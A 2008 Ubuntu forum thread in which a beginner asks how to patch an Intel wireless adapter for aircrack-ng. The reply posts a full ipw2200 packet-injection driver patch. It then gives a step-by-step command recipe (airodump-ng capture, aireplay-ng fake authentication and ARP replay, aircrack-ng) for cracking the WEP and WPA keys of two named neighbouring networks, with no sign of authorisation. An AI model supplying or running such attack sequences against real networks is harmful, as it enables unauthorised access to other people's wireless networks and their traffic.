---
title: "Another Aircrack Question"
date: 2008-06-21
forum: New to Ubuntu
---

### Post by anothernub on 2008-06-21
I've googled and read a bunch of stuff about aircrack-ng
and I noticed that you have to patch your wireless adapter or whatnot
My question or whatever is how would I know what patch to use
and if my actual adapter is capable of being patched
Now note that I am on a laptop and the only way to change is buying an 
external adapter; which at some point may happen but cant now...

```
 Network controller: Intel Corporation PRO/Wireless 3945ABG Network Connection 
```

Thats my adapter or w/e, if theres any other info I'd love to be helped or 
something, and I'm sorry if this gets quiet annoying >_<

---

### Post by WitchCraft on 2008-06-21
> **anothernub said:**
> I've googled and read a bunch of stuff about aircrack-ng
and I noticed that you have to patch your wireless adapter or whatnot
My question or whatever is how would I know what patch to use
and if my actual adapter is capable of being patched
Now note that I am on a laptop and the only way to change is buying an 
external adapter; which at some point may happen but cant now...

```
 Network controller: Intel Corporation PRO/Wireless 3945ABG Network Connection 
```

Thats my adapter or w/e, if theres any other info I'd love to be helped or 
something, and I'm sorry if this gets quiet annoying >_<

man aircrack-ng
```

SEE ALSO
       airdecap-ng(1)
      **[COLOR="Red"] airdriver-ng(1)[/COLOR]**
       aireplay-ng(1)
       airmon-ng(1)
       airodump-ng(1)
       airolib-ng(1)
       airsev-ng(1)
       airtun-ng(1)
       buddy-ng(1)
       easside-ng(1)
       ivstools(1)
       kstats(1)
       makeivs-ng(1)
       packetforge-ng(1)
       wesside-ng(1)

```


```

man airdriver-ng

```


```

root@all:~# airdriver-ng supported
Following stacks are supported:
0. IEEE80211
1. IEEE80211 Softmac
2. mac80211
Following drivers are supported:
0. ACX100/111 - IEEE80211
1. ADMtek 8211 - IEEE80211
2. ADMtek 8211 - mac80211
3. Atmel at76c50x - IEEE80211
4. Atmel at76_usb - IEEE80211
5. Broadcom 4300 - IEEE80211
6. Broadcom 4300 - mac80211
7. Cisco/Aironet 802.11 - IEEE80211 Softmac
8. HostAP - IEEE80211
9. Intel Pro Wireless 2100 B - IEEE80211
10. Intel Pro Wireless 2200 (B/G)/2915 (A/B/G) - IEEE80211
11. Intel Pro Wireless 3945 A/B/G - IEEE80211
12. Intel Pro Wireless 3945 A/B/G - raw mode
13. Intel Pro Wireless 3945 A/B/G - mac80211
14. Intel Pro Wireless 4965 A/B/G/N - mac80211
15. Lucent Hermes and Prism II - IEEE80211
16. Madwifi[-ng] - IEEE80211
17. Prism54 - IEEE80211
18. Prism54 - mac80211
19. Ralink rt2400 (legacy)
20. Ralink rt2400 (rt2x00) - IEEE80211
21. Ralink rt2400 (rt2x00) - mac80211
22. Ralink rt2500 (legacy)
23. Ralink rt2500 (rt2x00) - IEEE80211
24. Ralink rt2500 (rt2x00) - mac80211
25. Ralink rt2570 (legacy)
26. Ralink rt2570 (rt2x00) - IEEE80211
27. Ralink rt2570 (rt2x00) - mac80211
28. Ralink rt61 (legacy)
29. Ralink rt61 (rt2x00) - IEEE80211
30. Ralink rt61 (rt2x00) - mac80211
31. Ralink rt73 (legacy)
32. Ralink rt73 (rt2x00) - IEEE80211
33. Ralink rt73 (rt2x00) - mac80211
34. Realtek rtl8180 - custom
35. Realtek rtl8187 - custom
36. Realtek rtl8187 - mac80211
37. WLAN-NG - IEEE80211
38. Xircom Creditcard Netwave - IEEE80211
39. ZyDAS 1201 - IEEE80211 Softmac
40. ZyDAS 1211 - IEEE80211 Softmac
41. ZyDAS 1211rw - IEEE80211 Softmac
42. ZyDAS 1211rw - mac80211
43. NDIS Wrapper

```

-->
11. Intel Pro Wireless 3945 A/B/G - IEEE80211
12. Intel Pro Wireless 3945 A/B/G - raw mode
13. Intel Pro Wireless 3945 A/B/G - mac80211
14. Intel Pro Wireless 4965 A/B/G/N - mac80211



```

root@all:~# airdriver-ng detect

Found "Intel Pro Wireless 2200 (B/G)/2915 (A/B/G)" device: (ipw2200)
02:03.0 Network controller: Intel Corporation PRO/Wireless 2200BG Network Connection (rev 05)


PCI devices (generic detection):
02:03.0 Network controller: Intel Corporation PRO/Wireless 2200BG Network Connection (rev 05)

root@all:~# 


```


airdriver-ng install 10


if that doesn't work, for IPW2200 BG:
[http://prdownloads.sourceforge.net/ipw2200/ipw2200-1.2.2.tgz](http://prdownloads.sourceforge.net/ipw2200/ipw2200-1.2.2.tgz)

cd /root/Desktop/aircrack/IPW-2200/drivers/ipw2200-1.2.2

patch ipw2200.c my.patch

my.patch
```

diff -aur ipw2200-1.2.2/ipw2200.c ipw2200-1.2.2-patched/ipw2200.c
--- ipw2200-1.2.2/ipw2200.c	2007-07-12 08:01:17.000000000 +0200
+++ ipw2200-1.2.2-patched/ipw2200.c	2008-03-23 12:11:12.000000000 +0100
@@ -181,6 +181,7 @@
 static int ipw_queue_tx_hcmd(struct ipw_priv *priv, int hcmd, void *buf,
 			     int len, int sync);
 
+static int ipw_tx_skb(struct ipw_priv *priv, struct ieee80211_txb *txb, int pri);
 static void ipw_tx_queue_free(struct ipw_priv *);
 
 static struct ipw_rx_queue *ipw_rx_queue_alloc(struct ipw_priv *);
@@ -1971,6 +1972,65 @@
 static DEVICE_ATTR(net_stats, S_IWUSR | S_IRUGO,
 		   show_net_stats, store_net_stats);
 
+/* SYSFS INJECT */
+static ssize_t store_inject(struct device *d,
+#if LINUX_VERSION_CODE > KERNEL_VERSION(2,6,12)
+        struct device_attribute *attr,
+#endif
+        const char *buf, size_t count)
+{
+        struct ipw_priv *priv = (struct ipw_priv *)d->driver_data;
+        struct ieee80211_device *ieee = priv->ieee;
+        struct ieee80211_txb * txb;
+        struct sk_buff *skb_frag;
+        unsigned char * newbuf;
+        unsigned long flags;
+
+        // should test (ieee->is_queue_full)
+
+        // Fw only accepts data, so avoid accidental fw errors.
+        if ( (buf[0]&0x0c) != '\x08') {
+              //printk("ipw2200: inject: discarding non-data frame (type=%02X)\n",(int)(unsigned char)buf[0]);
+              return count;
+        }
+
+        if (count>1500) {
+              count=1500;
+              printk("ipw2200: inject: cutting down frame to 1500 bytes\n");
+        }
+
+        spin_lock_irqsave(&priv->lock, flags);
+
+        // Create a txb with one skb
+        txb = kmalloc(sizeof(struct ieee80211_txb) + sizeof(u8 *), GFP_ATOMIC);
+        if (!txb)
+              goto nosepuede;
+        txb->nr_frags=1;
+        txb->frag_size = ieee->tx_headroom;
+        txb->fragments[0]=__dev_alloc_skb(count + ieee->tx_headroom, GFP_ATOMIC);
+        if (!txb->fragments[0]) {
+              kfree(txb);
+              goto nosepuede;
+        }
+        skb_reserve(txb->fragments[0], ieee->tx_headroom);
+        txb->encrypted=0;
+        txb->payload_size=count;
+        skb_frag = txb->fragments[0];
+        newbuf=skb_put(skb_frag, count);
+
+        // copy data into txb->skb and send it
+        memcpy(newbuf, buf, count);
+
+        ipw_tx_skb(priv, txb, 0);
+
+nosepuede:
+        spin_unlock_irqrestore(&priv->lock, flags);
+        return count;
+}
+
+
+static DEVICE_ATTR(inject, S_IWUSR, NULL, store_inject);
+
 static ssize_t show_channels(struct device *d,
 			     struct device_attribute *attr,
 			     char *buf)
@@ -10694,6 +10754,8 @@
 	mutex_lock(&priv->mutex);
 	priv->config |= CFG_CUSTOM_MAC;
 	memcpy(priv->mac_addr, addr->sa_data, ETH_ALEN);
+	if (rtap_iface)
+		memcpy(priv->prom_net_dev->dev_addr, addr->sa_data, ETH_ALEN);
 	printk(KERN_INFO "%s: Setting MAC to " MAC_FMT "\n",
 	       priv->net_dev->name, MAC_ARG(priv->mac_addr));
 	queue_work(priv->workqueue, &priv->adapter_restart);
@@ -11741,6 +11803,7 @@
 #ifdef CONFIG_IPW2200_PROMISCUOUS
 	&dev_attr_rtap_iface.attr,
 	&dev_attr_rtap_filter.attr,
+	&dev_attr_inject.attr,
 #endif
 	NULL
 };
@@ -11820,6 +11883,7 @@
 	priv->prom_priv->priv = priv;
 
 	strcpy(priv->prom_net_dev->name, "rtap%d");
+	memcpy(priv->prom_net_dev->dev_addr, priv->mac_addr, ETH_ALEN);
 
 	priv->prom_net_dev->type = ARPHRD_IEEE80211_RADIOTAP;
 	priv->prom_net_dev->open = ipw_prom_open;
@@ -11934,7 +11998,9 @@
 		goto out_destroy_workqueue;
 	}
 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(2,6,24)) && defined(SET_MODULE_OWNER)
 	SET_MODULE_OWNER(net_dev);
+#endif
 	SET_NETDEV_DEV(net_dev, &pdev->dev);
 
 	mutex_lock(&priv->mutex);
diff -aur ipw2200-1.2.2/ipw2200.h ipw2200-1.2.2-patched/ipw2200.h
--- ipw2200-1.2.2/ipw2200.h	2007-07-12 08:01:19.000000000 +0200
+++ ipw2200-1.2.2-patched/ipw2200.h	2008-03-23 12:11:13.000000000 +0100
@@ -2014,4 +2014,12 @@
 
 #define IPW_MAX_CONFIG_RETRIES 10
 
+/*
+ * Hhack to get code compiling on new kernels, the define below
+ * seem to be removed from the linux headers.
+ */
+#ifndef MAC_ARG
+#define MAC_ARG(x) ((u8*)(x))[0],((u8*)(x))[1],((u8*)(x))[2],((u8*)(x))[3],((u8*)(x))[4],((u8*)(x))[5]
+#endif
+
 #endif				/* __ipw2200_h__ */
diff -aur ipw2200-1.2.2/Makefile ipw2200-1.2.2-patched/Makefile
--- ipw2200-1.2.2/Makefile	2007-07-12 08:01:14.000000000 +0200
+++ ipw2200-1.2.2-patched/Makefile	2008-03-22 19:19:06.000000000 +0100
@@ -13,7 +13,7 @@
 # NOTE: If you have previously added the IPW project to your kernel 
 # 	and configured it for inclusion, these settings will be 
 #	overridden by your kernel configuration.
-ifndef CONFIG_IPW2200
+#ifndef CONFIG_IPW2200
 EXTERNAL_BUILD=y
 CONFIG_IPW2200=m
 CONFIG_IPW2200_DEBUG=y
@@ -30,16 +30,16 @@
 # simply uncomment:
 #
 # NOTE:  To use RADIOTAP you must also enable MONITOR above.
-#CONFIG_IPW2200_RADIOTAP=y
+CONFIG_IPW2200_RADIOTAP=y
 
 # The above monitor mode provides standard monitor mode.  The following
 # will create a new interface (named rtap%d) which will be sent all
 # 802.11 frames received on the interface
 #
 # NOTE:  To use PROMISCUOUS you must also enable MONITOR above.
-#CONFIG_IPW2200_PROMISCUOUS=y
+CONFIG_IPW2200_PROMISCUOUS=y
 
-endif
+#endif
 
 # We have to add drivers/net/wireless until ieee802_11.h is in the default
 # include path

```

make
make install
shutdown -r now



but in your case, just try:
airdriver-ng install 11

then you best restart your computer: shutdown -r now

```



airmon-ng stop eth1
airmon-ng start eth1 13
airmon-ng start eth1 6
aireplay-ng -9 eth1
-------------------------------------
aireplay-ng -9 eth1
00:52:11  Trying broadcast probe requests...
00:52:13  No Answer...
00:52:13  Found 1 AP 

00:52:13  Trying directed probe requests...
00:52:13  00:1C:10:36:86:64 - channel: 13 - 'spitpda'
00:52:19   0/30:   0%
-------------------------------------


 [ CH 13 ][ Elapsed: 2 mins ][ 2008-06-08 01:41 ]
                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
                                                                                                       
 00:1C:10:36:86:64  173   8       43        0    0  13  48  WPA  TKIP   PSK  spitpda                  
 00:11:24:0E:8F:BD  170   0        0        0    0   6  54  WEP  WEP         KLD                       
                                                                                                       
 BSSID              STATION            PWR   Rate  Lost  Packets  Probes                               

-------------------------------------
example
      MAC address of PC running aircrack-ng suite: 00:0F:B5:88:AC:82
    *
      BSSID (MAC address of access point): 00:14:6C:7E:40:80
    *
      ESSID (Wireless network name): teddy
    *
      Access point channel: 9
    *
      Wireless interface: ath0
-------------------------------------
KLD:
      MAC address of PC running aircrack-ng suite: 00:16:6f:ad:53:48 
    *
      BSSID (MAC address of access point): 00:11:24:0E:8F:BD
    *
      ESSID (Wireless network name): KLD
    *
      Access point channel: 6
    *
      Wireless interface: eth1

-------------------------------------
spitpda:
      MAC address of PC running aircrack-ng suite: 00:16:6f:ad:53:48 
    *
      BSSID (MAC address of access point): 00:1C:10:36:86:64
    *
      ESSID (Wireless network name): spitpda
    *
      Access point channel: 13
    *
      Wireless interface: eth1
-------------------------------------



airodump-ng --ivs --write output --channel 13 eth1 = \|/
airodump-ng -c 13 --bssid 00:1C:10:36:86:64 -w output eth1
aireplay-ng -1 0 -e spitpda -a 00:1C:10:36:86:64 -h 00:16:6f:ad:53:48  eth1
or
aireplay-ng -1 6000 -o 1 -q 10 -e spitpda -a 00:1C:10:36:86:64 -h 00:16:6f:ad:53:48  eth1
aireplay-ng -3 -b 00:1C:10:36:86:64 -h 00:16:6f:ad:53:48  eth1

aircrack-ng -z -b 00:1C:10:36:86:64 output*.cap
aircrack-ng -b 00:1C:10:36:86:64 output*.cap
-------------------------------------
KLD (WEP----- WPA)
airodump-ng -c 6 --bssid 00:11:24:0E:8F:BD -w output eth1
aireplay-ng -1 0 -e KLD -a 00:11:24:0E:8F:BD -h 00:16:6f:ad:53:48  eth1
or
aireplay-ng -1 6000 -o 1 -q 10 -e KLD -a 00:11:24:0E:8F:BD -h 00:16:6f:ad:53:48  eth1
aireplay-ng -3 -b 00:11:24:0E:8F:BD -h 00:16:6f:ad:53:48 eth1

aircrack-ng -z -b 00:11:24:0E:8F:BD output*.cap
aircrack-ng -b 00:11:24:0E:8F:BD output*.cap
*****************************************************************************************

tcpdump -n -vvv -s0 -e -i <interface name> | grep -i -E &#8221;(RA:<MAC addreess of your card>|Authentication|ssoc)&#8221; 

tcpdump -n -vvv -s0 -e -i eth1 | grep -i -E "(RA:00:16:6f:ad:53:48 |Authentication|ssoc)"

```

---

